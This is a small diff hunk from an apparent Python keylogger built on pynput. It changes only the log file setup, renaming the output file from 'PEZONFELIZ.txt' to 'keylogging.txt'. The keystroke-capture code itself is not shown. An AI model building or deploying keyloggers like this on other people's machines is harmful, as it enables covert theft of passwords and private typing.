@@ -3,7 +3,7 @@ from pynput.keyboard \
 import logging 
 
 logging.basicConfig(
-    filename=("PEZONFELIZ.txt"),
+    filename=("keylogging.txt"),
     level=logging.DEBUG,
     format=" %(asctime)s-%(message)s")
 
